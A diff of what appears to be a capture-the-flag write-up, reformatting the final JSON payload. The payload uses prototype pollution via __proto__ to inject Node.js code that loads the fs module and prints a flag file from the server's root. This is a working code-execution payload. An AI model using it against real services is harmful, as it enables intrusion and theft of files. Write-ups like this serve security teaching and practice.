@@ -202,7 +202,15 @@ The only thing left was to take the final JSON and JSFuck and send it to the ser
 JSON:
 
 ```json
-{"__proto__":{"undefined":"\n    const fs = global.process.mainModule.constructor._load('fs');\n    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))\n    ","\n    const fs = global.process.mainModule.constructor._load('fs');\n    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))\n    ":{"\n    const fs = global.process.mainModule.constructor._load('fs');\n    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))\n    ":"constructor","undefined":"filter"}}}
+{
+  "__proto__": {
+    "undefined": "    const fs = global.process.mainModule.constructor._load('fs');    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))    ",
+    "    const fs = global.process.mainModule.constructor._load('fs');    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))    ": {
+      "    const fs = global.process.mainModule.constructor._load('fs');    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))    ": "constructor",
+      "undefined": "filter"
+    }
+  }
+}
 ```
 
 JSFuck:
